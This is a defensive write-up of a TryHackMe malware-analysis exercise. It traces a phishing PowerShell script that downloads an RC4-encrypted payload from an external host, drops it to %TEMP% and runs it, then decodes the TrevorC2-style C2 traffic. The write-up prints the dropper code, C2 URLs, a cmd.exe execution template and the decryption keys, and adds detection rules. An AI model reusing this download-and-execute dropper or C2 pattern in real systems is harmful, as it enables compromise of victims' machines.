# Cyber Exercise Writeup: Masquerade | https://tryhackme.com/room/masquerade

## BLUF

**Bottom Line Up Front:**
A suspicious PowerShell execution chain was identified in the Windows event logs after a user ran a script from a phishing email. The script downloaded an encrypted second-stage payload, decrypted it using RC4, wrote it to disk as `amdfendrsr.exe`, and executed it from the user’s temporary directory. Follow-on packet capture analysis showed the payload communicating with a command-and-control server using TrevorC2-style HTTP traffic, double Base64 encoding, AES encryption, and a fake Google homepage as decoy infrastructure.

The exercise demonstrated how host-based logs, packet capture analysis, payload decryption, and strings analysis can be combined to reconstruct a malware infection chain from initial script execution through encrypted C2 communications.

---

## Executive Summary

**Exercise Name:** Masquerade
**Platform / Environment:** TryHackMe
**Exercise Type:** Malware Analysis / Forensics
**Primary Domain:** Endpoint Analysis / Network Defense / Threat Hunting / Incident Response / Malware Analysis
**Difficulty:** Medium
**Date Completed:** `<YYYY-MM-DD>`
**Author:** Justin Applebury
**Classification / Handling:** Unclassified / Training Only

### Mission Relevance

This exercise reinforces skills directly relevant to defensive cyberspace operations, including endpoint log analysis, malicious PowerShell triage, packet capture review, payload extraction, malware deobfuscation, C2 identification, and encrypted traffic analysis. These skills support incident response, threat hunting, and cyber defense missions in federal, military, and intelligence community environments where analysts must quickly determine what happened, what systems were affected, and how adversary infrastructure was used.

---

# 1. Scope and Objectives

## Scope

**Target System / Network:** Windows event logs and packet capture
**Rules of Engagement:** Malware analysis in an isolated training environment
**Scenario Assumptions:** Jim from Finance ran a script described as “apply critical security updates” from a phishing email. Unusual network traffic was later observed.
**Limitations:** Analyze the provided Windows event logs, packet capture, and malicious code artifacts. Do not execute malware outside the isolated lab environment.

## Objectives

* Investigate what happened on the endpoint.
* Determine the impact of the malicious script.
* Identify how the attacker established control over the system.
* Identify the external domain contacted during script execution.
* Determine the encryption algorithm used by the script.
* Determine the key used to decrypt the second-stage payload.
* Identify the timestamp of the server response containing the payload.
* Calculate the SHA-256 hash of the extracted and decrypted payload.
* Identify the remote URL used by the client to communicate with the victim machine.
* Determine which encryption key and algorithm the client uses.
* Decrypt the commands executed by the attacker on the victim.
* Recover and submit the final CTF flag.

---

# 2. Environment Details

| Field                       | Details                                                             |
| --------------------------- | ------------------------------------------------------------------- |
| Target IP / Hostname        | `DESKTOP-I6C5C7M`                                                   |
| Affected User SID           | `S-1-5-21-753961636-1548247123-2641200033-1001`                     |
| Analyst System              | Windows / Wireshark / CyberChef                                     |
| Operating System Identified | Windows                                                             |
| Network Segment             | TryHackMe lab environment                                           |
| Tools Used                  | Event Viewer, Wireshark, CyberChef, Strings analysis, hashing tools |
| Access Level at Start       | Analyst reviewing logs and PCAP                                     |
| Final Access Level          | N/A — forensic analysis only                                        |

---

# 3. BLUF Technical Findings

| Finding                                                        | Severity | Operational Impact                                                            | Evidence                                                |
| -------------------------------------------------------------- | -------: | ----------------------------------------------------------------------------- | ------------------------------------------------------- |
| PowerShell executed suspicious script `updates.ps1`            |     High | Indicates likely phishing-driven script execution and initial malware staging | PowerShell Event ID 4104 script block logs              |
| Script downloaded payload from `api-edgecloud[.]xyz/amd[.]bin` |     High | External payload retrieval from suspicious infrastructure                     | PowerShell `DownloadString()` and PCAP DNS/HTTP traffic |
| Payload was RC4 encrypted and decrypted using embedded key     |     High | Confirms intentional payload obfuscation and staging                          | RC4 KSA logic in PowerShell script                      |
| Decrypted payload was written as `%TEMP%\amdfendrsr.exe`       |     High | Malware was dropped and executed from a temporary directory                   | PowerShell `WriteAllBytes()` and `Start-Process`        |
| Payload communicated with `34[.]174[.]57[.]99`                 | Critical | Indicates command-and-control activity                                        | HTTP traffic to `/images?guid=`                         |
| C2 used fake Google homepage as decoy content                  |   Medium | Infrastructure attempted to appear benign during inspection                   | `GET /` response served Google-looking HTML from C2 IP  |
| C2 command output was double Base64 encoded and AES encrypted  |     High | Adversary attempted to hide command output and host data                      | Large `/images?guid=` values in packet capture          |
| Payload contained `cmd.exe /Q /c {0} 2>&1` template            | Critical | Confirms capability to execute arbitrary commands and capture output          | Extracted payload strings                               |

---

# 4. Methodology

## Approach

The investigation was conducted in four major phases:

1. Review Windows event logs for suspicious process and PowerShell activity.
2. Deobfuscate the PowerShell script to identify payload retrieval and decryption logic.
3. Analyze the packet capture to locate payload download and C2 communications.
4. Decrypt recovered payloads and C2 messages to reconstruct attacker activity.

---

## Event Log Analysis

First, I examined the Windows event logs.

<img width="958" height="281" alt="PowerShell event log overview" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />

The logs show that PowerShell launched and executed several commands within approximately 21 seconds. This timing suggests an automated PowerShell script rather than normal interactive use.

The first three informational alerts show that PowerShell started and provide the affected user and computer details:

```text
User: S-1-5-21-753961636-1548247123-2641200033-1001
Computer: DESKTOP-I6C5C7M
```

The first verbose alert contains a simple script block:

```powershell
prompt
```

This is not suspicious by itself. PowerShell uses the `prompt` function to display or customize the interactive command prompt. The `ScriptBlockID` is a unique identifier for the script block and does not provide meaningful evidence by itself.

The second verbose alert is more important:

```powershell
.\updates.ps1
```

This command executes `updates.ps1` from the current working directory. I noted this filename for correlation with later log and packet capture evidence.

The third verbose alert shows the actual script content.

<img width="1125" height="176" alt="PowerShell script block content" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />

The script is obfuscated to make analysis harder and to reduce detection by simple signatures.

---

## PowerShell Script Deobfuscation

### Key Construction

The first important line defines a key:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
```

The script splits the key into smaller strings and concatenates them at runtime.

Combined key:

<details>
<summary>Question 3 Spoiler</summary>

```text
X9vT3pL2QwE8xR6ZkYhC4s
```

</details>

This key is later used to decrypt the downloaded payload.

---

### Payload Download

The next line downloads content from an external URL:

```powershell
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
```

The `-join` operation reconstructs the URL from multiple string fragments. The `-replace '\s',''` operation removes whitespace from the downloaded data.

Decoded and defanged URL:

<details>
<summary>Question 1 Spoiler</summary>

```text
hxxp://api-edgecloud[.]xyz/amd[.]bin
```

</details>

This URL was defanged to prevent accidental browsing to malicious infrastructure.

---

### Hex Decoding

The following code converts the downloaded hex string into bytes:

```powershell
$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
```

Reformatted:

```powershell
$b = for ($x = 0; $x -lt $h.Length; $x += 2) {
    [Convert]::ToByte($h.Substring($x, 2), 16)
}
```

This loop processes the downloaded string two characters at a time. Each pair of hexadecimal characters is converted into one byte and added to the `$b` byte array.

In plain language, the script:

1. Starts at the beginning of the downloaded data.
2. Extracts two hex characters.
3. Converts them into a byte.
4. Repeats until the full payload has been converted.

---

### RC4 Decryption Routine

The next section contains the decryption logic:

```powershell
$s = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp } $i = $j = 0 $d = foreach ($byte in $b) { $i = ($i + 1) % 256 $j = ($j + $s[$i]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp $byte -bxor $s[($s[$i] + $s[$j]) % 256] }
```

Reformatted:

```powershell
$s = 0..255
$j = 0

for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
    $temp = $s[$i]
    $s[$i] = $s[$j]
    $s[$j] = $temp
}

$i = $j = 0

$d = foreach ($byte in $b) {
    $i = ($i + 1) % 256
    $j = ($j + $s[$i]) % 256
    $temp = $s[$i]
    $s[$i] = $s[$j]
    $s[$j] = $temp
    $byte -bxor $s[($s[$i] + $s[$j]) % 256]
}
```

This logic initializes a 256-byte state array, mixes it using the key, and XORs each payload byte with a generated keystream.

This is consistent with:

<details>
<summary>Question 2 Spoiler</summary>

```text
RC4 Key-Scheduling Algorithm (KSA)
```

</details>

This confirms the downloaded payload is RC4 encrypted.

---

### Payload Write and Execution

The final PowerShell block writes the decrypted payload to disk and executes it:

```powershell
$p = $env:TEMP + '\amdfendrsr.exe'
[System.IO.File]::WriteAllBytes($p, $d)
Start-Process $p
```

The script writes the decrypted executable to:

```text
%TEMP%\amdfendrsr.exe
```

Then it launches the payload with `Start-Process`.

At this point, the PowerShell script has acted as a downloader, decryptor, dropper, and launcher.

---

## Packet Capture Analysis

The provided packet capture contains 4,342 packets, which is too many to review manually one packet at a time. I used Wireshark filtering to reduce the noise and focus on traffic related to the suspicious script execution.

Possible pivot points included:

* The same timeframe as the Windows logs.
* The filename `amdfendrsr.exe`.
* DNS traffic.
* HTTP traffic.
* The malicious download domain.
* Suspicious raw IP communication.

I started by filtering DNS traffic for the malicious domain.

<img width="1261" height="293" alt="DNS lookup for malicious URL" src="https://github.com/user-attachments/assets/bb345bdb-8e75-4d9e-a0f4-1d5507e28851" />

The DNS query resolved the malicious download domain to:

```text
34[.]174[.]85[.]91
```

I then filtered for traffic to and from that IP address. Only one TCP connection was identified. Following that stream revealed the downloaded encrypted payload.

<img width="860" height="818" alt="TCP stream containing encrypted payload" src="https://github.com/user-attachments/assets/d0a19d02-7ef8-4641-8322-970e520b8fdd" />

Based on the PowerShell analysis, I knew the downloaded data needed to be:

1. Whitespace stripped.
2. Hex decoded.
3. RC4 decrypted with the key `X9vT3pL2QwE8xR6ZkYhC4s`.

I recreated this process in CyberChef.

<img width="1913" height="826" alt="CyberChef RC4 payload decryption" src="https://github.com/user-attachments/assets/468e493e-0dfd-4057-b528-88fad95e1721" />

The decrypted output confirmed that the payload was a Windows executable.

Next, I calculated the SHA-256 hash of the decrypted payload. This can be used for detection, correlation, and verification across other potentially infected systems.

<img width="1093" height="527" alt="SHA-256 hash of decrypted payload" src="https://github.com/user-attachments/assets/406a675d-3bc6-4c54-aa59-df1b1c9e3430" />

---

## Payload Strings Analysis

Since the decrypted payload is compiled, I inspected its strings for useful indicators.

One string immediately stood out:

<img width="283" height="259" alt="TrevorC2 string" src="https://github.com/user-attachments/assets/a8fd034e-4837-4c04-9cc1-f9545cbbaa1d" />

This suggested a possible relationship to TrevorC2.

Other strings appeared to be separated by null bytes, which made them harder to read directly.

<img width="942" height="176" alt="Null-separated strings" src="https://github.com/user-attachments/assets/01f6bdcc-35b7-49f5-9a26-f6c2658c847a" />

<img width="944" height="76" alt="More null-separated strings" src="https://github.com/user-attachments/assets/586b66f9-82e0-4bd6-9bd7-58df0b48ef1d" />

After extracting the null-separated characters into readable text, several important configuration values became visible.

<img width="640" height="208" alt="Extracted C2 strings" src="https://github.com/user-attachments/assets/ee04a2af-1858-470d-b62b-c3f17e0b2923" />

Recovered strings included:

```text
http://34.174.57.99/images?guid=
GET
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: identity
[*] Cannot connect to {0} seconds...
http://34.174.57.99/
<!-- {0} oldcss= --></body>
nothing
cmd.exe /Q /c {0} 2>&1
```

These strings show that the payload likely:

1. Communicates with a C2 server at `34[.]174[.]57[.]99`.
2. Sends data using the `/images?guid=` endpoint.
3. Uses a legacy Internet Explorer-style User-Agent.
4. Uses a fake webpage as decoy infrastructure.
5. Parses command tasking from hidden HTML comments.
6. Executes commands through `cmd.exe`.
7. Redirects command errors into standard output using `2>&1`.

The command execution template is especially important:

```cmd
cmd.exe /Q /c {0} 2>&1
```

Breakdown:

| Component | Meaning                                        |
| --------- | ---------------------------------------------- |
| `cmd.exe` | Launches the Windows command shell             |
| `/Q`      | Quiet mode                                     |
| `/c {0}`  | Runs the command inserted into `{0}` and exits |
| `2>&1`    | Redirects stderr into stdout                   |

This strongly indicates the payload is a command-execution implant.

---

## TrevorC2 Research

Before continuing, I researched TrevorC2. TrevorC2 is a command-and-control framework associated with TrustedSec and Dave Kennedy. It is designed to blend C2 traffic into web traffic and can hide tasking or command output in web content.

The recovered payload strings are consistent with TrevorC2-style behavior:

* Fake web page content.
* HTTP GET-based communication.
* Encoded and encrypted payloads.
* Hidden command tasking.
* Command execution through `cmd.exe`.

The recovered AES passphrase was:

```text
M4squ3r4d3Th3P4ck3tSt34lthM0d31337
```

This value is 34 bytes long, which is not a valid raw AES key length. AES keys must be 16, 24, or 32 bytes. A common method of converting a passphrase into a valid 32-byte AES-256 key is to take the SHA-256 hash of the passphrase.

---

## C2 Traffic Analysis

### Initial Beacon

Next, I reviewed the traffic immediately after the payload was downloaded and executed.

Wireshark filter:

```text
tcp.stream eq 43
```

<img width="820" height="280" alt="Initial C2 beacon" src="https://github.com/user-attachments/assets/ba9816cc-3dba-4433-8bd0-10cddfe7d844" />

The request was:

```http
GET /images?guid=<encoded_data> HTTP/1.1
Host: 34.174.57.99
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: identity
Connection: Close
```

This appears to be the initial beacon to the C2 server.

The `guid` value is not a normal GUID. Instead, it is Base64-encoded data. This is consistent with an implant sending an encoded host identifier or initial check-in message.

The server responded with an empty body:

```http
HTTP/1.1 200 OK
Server: IIS
Content-Length: 0
Set-Cookie: sessionid=MneddXbRtQMyUlh
```

The ETag was:

```text
da39a3ee5e6b4b0d3255bfef95601890afd80709
```

This is the SHA-1 hash of an empty string, matching the `Content-Length: 0` response.

The server also issued the following session cookie:

```text
sessionid=MneddXbRtQMyUlh
```

This appears to be a session identifier used to track future traffic from the compromised host.

---

### Decoy Google Page

Next, I reviewed the following stream.

Wireshark filter:

```text
tcp.stream eq 44
```

<img width="848" height="713" alt="Fake Google page from C2" src="https://github.com/user-attachments/assets/7dfe2540-617c-4a14-a649-73d09a319144" />

The client requested the C2 root page:

```http
GET / HTTP/1.1
Host: 34.174.57.99
Cookie: sessionid=MneddXbRtQMyUlh
```

The client reused the same session cookie from the initial beacon.

<details>
<summary>Question 6 Spoiler</summary>

```text
34[.]174[.]57[.]99
```

</details>

The server responded with a Google-looking HTML page. However, this page was not served by Google. It was served by the C2 IP address.

The ETag for the decoy page was:

```text
544dec025c05c611ec4032a4c077907ce423361c
```

This matches the SHA-1 hash of the returned HTML body.

This suggests that the C2 server was hosting a copied Google homepage as a decoy. The purpose was likely to make the server look benign during casual inspection.

This request repeated approximately every 15 seconds, indicating beacon or polling behavior while the client waited for tasking.

---

### Large `guid` Request

After several decoy page requests, the client made another request to `/images?guid=`. This time, the `guid` value was unusually large.

<img width="844" height="724" alt="Large C2 GUID request" src="https://github.com/user-attachments/assets/0acce5b1-d141-4757-8302-d20ad1d51597" />

The request followed the same pattern:

```http
GET /images?guid=<large_encoded_blob> HTTP/1.1
Host: 34.174.57.99
Cookie: sessionid=MneddXbRtQMyUlh
User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
```

The `guid` field is again not a real GUID. It is a large encoded blob.

Based on the earlier TrevorC2 research and recovered payload strings, the data appears to be:

1. Base64 encoded.
2. Base64 encoded again.
3. AES encrypted.

The AES key was derived by taking the SHA-256 hash of the recovered passphrase:

```text
M4squ3r4d3Th3P4ck3tSt34lthM0d31337
```

AES also requires an IV. In this case, the IV appears to be taken from the beginning of the encrypted payload. I used CyberChef to extract the IV material and decrypt the remaining ciphertext.

<img width="1164" height="890" alt="CyberChef AES decrypt of C2 payload" src="https://github.com/user-attachments/assets/81ecf186-afda-4829-b696-a4e924acda0f" />

The decrypted data showed that the C2 client extracted information from the desktop.

---

### Decrypting All `guid` Messages

I then filtered for all HTTP GET requests containing `guid=`.

<img width="1303" height="197" alt="Wireshark filter for guid traffic" src="https://github.com/user-attachments/assets/7fa45e43-4907-47bf-a9bc-74a5c6de0e80" />

After decrypting each `guid` payload, I identified the following results:

| Request               | Decrypted Result                          |
| --------------------- | ----------------------------------------- |
| First `guid` request  | Defines `&magic_hostname=DESKTOP-I6C5C7M` |
| Second `guid` request | Desktop information / command output      |
| Third `guid` request  | Output of `ipconfig /all`                 |
| Final `guid` request  | Final CTF flag                            |

The final decrypted payload contained the flag required for the final challenge question.

<img width="1169" height="657" alt="Final decrypted C2 message containing flag" src="https://github.com/user-attachments/assets/eef55fb0-395b-438f-8749-5549e954b497" />

---

## Phases

1. Reconnaissance
2. Enumeration
3. Vulnerability identification
4. Exploitation or investigation
5. Post-exploitation or evidence review
6. Impact analysis
7. Defensive recommendations
8. Reporting

---

# 5. Reconnaissance and Enumeration

## Network Discovery

No active network scanning was performed. The analysis was based on supplied Windows event logs and packet capture evidence.

Primary discovery methods:

* Windows PowerShell event log review.
* DNS query analysis.
* HTTP stream analysis.
* TCP stream reconstruction.
* Payload extraction from PCAP.

Wireshark filters used during triage:

```text
dns
```

```text
ip.addr == 34.174.85.91
```

```text
ip.addr == 34.174.57.99
```

```text
http
```

```text
tcp.stream eq 43
```

```text
tcp.stream eq 44
```

```text
http.request.uri contains "guid="
```

---

# 6. Vulnerability Identification / Initial Access Analysis

## Initial Access Vector

The scenario indicates that Jim from Finance executed a script from a phishing email. The script was likely disguised as a critical security update.

Observed execution:

```powershell
.\updates.ps1
```

The script performed several suspicious actions:

* Reconstructed an external URL through string concatenation.
* Downloaded remote content using `System.Net.WebClient`.
* Removed whitespace from the downloaded content.
* Converted hex text into bytes.
* Decrypted the payload using RC4.
* Wrote an executable to `%TEMP%`.
* Executed the payload.

This behavior is consistent with a phishing-delivered malware dropper.

---

# 7. Exploitation / Investigation

## Malicious PowerShell Behavior

The script downloaded an encrypted payload from:

```text
hxxp://api-edgecloud[.]xyz/amd[.]bin
```

The payload was encrypted with RC4 using the key:

```text
X9vT3pL2QwE8xR6ZkYhC4s
```

The decrypted executable was written to:

```text
%TEMP%\amdfendrsr.exe
```

Then executed using:

```powershell
Start-Process $p
```

This shows successful execution of a second-stage payload.

---

## Second-Stage Payload Behavior

The second-stage payload contained strings consistent with a C2 client.

Important recovered strings:

```text
http://34.174.57.99/images?guid=
http://34.174.57.99/
<!-- {0} oldcss= --></body>
nothing
cmd.exe /Q /c {0} 2>&1
```

These strings indicate:

* C2 communication over HTTP.
* Encoded data sent through the `guid` parameter.
* Fake Google homepage used as decoy content.
* Command execution through `cmd.exe`.
* Captured output returned to the C2 server.

---

# 8. Post-Exploitation / Evidence Review

## C2 Session Reconstruction

The C2 session followed this general sequence:

```text
1. Client beacons to /images?guid=<encoded_data>
2. Server responds with HTTP 200 and empty body
3. Server sets sessionid cookie
4. Client requests /
5. Server returns fake Google homepage
6. Client repeats polling behavior approximately every 15 seconds
7. Client sends large encrypted blobs through /images?guid=
8. Decrypted blobs reveal host data, command output, and the final flag
```

## Command Output

Decrypted C2 messages showed:

* Hostname identification.
* Desktop information.
* Output from `ipconfig /all`.
* Final flag data.

This confirms the attacker had command execution capability on the victim endpoint.

---

# 9. Impact Analysis

## Operational Impact

The malware established command-and-control over the victim endpoint and allowed the attacker to execute arbitrary commands using `cmd.exe`. The use of encoded and encrypted HTTP traffic allowed the malware to blend into normal web traffic while hiding command output and host data.

## Impacted Assets

| Asset             | Impact                                          |
| ----------------- | ----------------------------------------------- |
| `DESKTOP-I6C5C7M` | Compromised endpoint                            |
| User environment  | PowerShell script execution and malware staging |
| Network traffic   | C2 communication over HTTP                      |
| Local system data | Host and network configuration data extracted   |

## Attacker Capabilities Observed

| Capability               | Evidence                                     |
| ------------------------ | -------------------------------------------- |
| Payload staging          | Download of `amd.bin`                        |
| Payload decryption       | RC4 logic in PowerShell                      |
| Code execution           | `Start-Process` and `cmd.exe /Q /c {0} 2>&1` |
| C2 communication         | Requests to `34[.]174[.]57[.]99`             |
| Data encoding/encryption | Double Base64 and AES-encrypted `guid` blobs |
| Decoy infrastructure     | Fake Google homepage from C2 server          |

---

# 10. Defensive Recommendations

## Endpoint Controls

* Enable and centrally collect PowerShell Script Block Logging.
* Alert on PowerShell usage of:

  * `DownloadString`
  * `System.Net.WebClient`
  * `WriteAllBytes`
  * `Start-Process`
  * `-bxor`
  * `0..255`
* Restrict PowerShell execution with Constrained Language Mode where feasible.
* Block or alert on executables launched from `%TEMP%`.
* Monitor suspicious parent-child process relationships, especially unknown executables spawning `cmd.exe`.

## Network Controls

* Alert on HTTP requests to raw IP addresses.
* Detect large query strings in suspicious parameters such as `guid=`.
* Monitor repeated polling intervals to uncommon destinations.
* Alert when non-Google infrastructure serves Google-looking content.
* Block known malicious indicators:

  * `api-edgecloud[.]xyz`
  * `34[.]174[.]85[.]91`
  * `34[.]174[.]57[.]99`

## User Awareness

* Train users to report suspicious “security update” emails.
* Reinforce that legitimate updates should come from approved enterprise management tools.
* Improve phishing reporting workflows for non-technical users.

## Detection Engineering

Recommended detection logic:

```text
EventCode=4104
AND "DownloadString"
AND "WriteAllBytes"
AND "Start-Process"
```

```text
EventCode=4104
AND "-bxor"
AND "0..255"
AND "% 256"
```

```text
uri_path="/images"
AND uri_query="guid=*"
AND len(uri_query) > 500
```

```text
ParentImage="*\amdfendrsr.exe"
AND Image="*\cmd.exe"
AND CommandLine="*/Q /c*"
AND CommandLine="*2>&1*"
```

---

# 11. Indicators of Compromise

## Network Indicators

| Indicator                                                       | Type           | Notes                              |
| --------------------------------------------------------------- | -------------- | ---------------------------------- |
| `api-edgecloud[.]xyz`                                           | Domain         | Initial payload download           |
| `hxxp://api-edgecloud[.]xyz/amd[.]bin`                          | URL            | RC4-encrypted second-stage payload |
| `34[.]174[.]85[.]91`                                            | IP address     | Resolved payload download host     |
| `34[.]174[.]57[.]99`                                            | IP address     | C2 server                          |
| `/images?guid=`                                                 | URI path/query | Encoded C2 communication           |
| `sessionid=MneddXbRtQMyUlh`                                     | HTTP cookie    | C2 session tracking                |
| `Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko` | User-Agent     | Hardcoded legacy browser UA        |

## Host Indicators

| Indicator                | Type             | Notes                             |
| ------------------------ | ---------------- | --------------------------------- |
| `updates.ps1`            | Script           | Initial PowerShell dropper        |
| `amdfendrsr.exe`         | Executable       | Dropped payload                   |
| `%TEMP%\amdfendrsr.exe`  | File path        | Payload execution location        |
| `cmd.exe /Q /c {0} 2>&1` | Command template | C2 command execution              |
| `DESKTOP-I6C5C7M`        | Hostname         | Compromised endpoint in challenge |

## Cryptographic / Encoding Artifacts

| Artifact            | Value                                      |
| ------------------- | ------------------------------------------ |
| RC4 key             | `X9vT3pL2QwE8xR6ZkYhC4s`                   |
| AES passphrase      | `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`       |
| AES key derivation  | `SHA-256(passphrase)`                      |
| Encoding pattern    | Double Base64                              |
| Empty response ETag | `da39a3ee5e6b4b0d3255bfef95601890afd80709` |
| Decoy page ETag     | `544dec025c05c611ec4032a4c077907ce423361c` |

---

# 12. Lessons Learned

This exercise showed the importance of correlating endpoint telemetry with network traffic. The Windows event logs revealed the initial PowerShell execution and decryption routine, while the packet capture confirmed payload download, C2 check-in, and encrypted command output.

The most important analytical pivots were:

* PowerShell Event ID 4104 script block logging.
* DNS resolution for the payload domain.
* TCP stream reconstruction.
* RC4 decryption of the second-stage payload.
* Strings analysis of the decrypted executable.
* C2 traffic decryption using double Base64 and AES.

This type of workflow is directly applicable to real-world incident response, where analysts often need to reconstruct adversary behavior from partial artifacts across multiple telemetry sources.

---

# 13. Conclusion

The investigation confirmed that the victim executed a malicious PowerShell script disguised as an update. The script downloaded an encrypted payload, decrypted it with RC4, wrote it to disk, and executed it.

The second-stage payload operated as a C2 client. It communicated with `34[.]174[.]57[.]99` using HTTP traffic disguised as image requests and fake Google homepage requests. The C2 data was double Base64 encoded and AES encrypted. Once decrypted, the traffic revealed host identification, command output, network configuration data, and the final CTF flag.

Overall, the exercise demonstrated a complete malware infection chain from phishing-driven execution through encrypted C2 communications and command output recovery.
